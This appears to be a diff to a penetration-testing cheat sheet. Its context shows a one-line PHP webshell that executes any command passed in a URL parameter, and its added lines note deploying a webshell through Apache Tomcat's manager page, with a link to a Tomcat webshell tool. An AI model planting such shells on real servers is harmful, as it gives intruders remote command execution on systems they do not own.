@@ -35,3 +35,9 @@ Basic PHP webshell
 # Take input from the URL paramter. e.g http://<IP>/shell.php?cmd=whoami
 <?php system($_GET['cmd']); ?>
 ```
+### Apache Tomcat
+Requires admin access:
+```
+http://127.0.0.1:18080/manager/html
+```
+https://github.com/p0dalirius/Tomcat-webshell-application
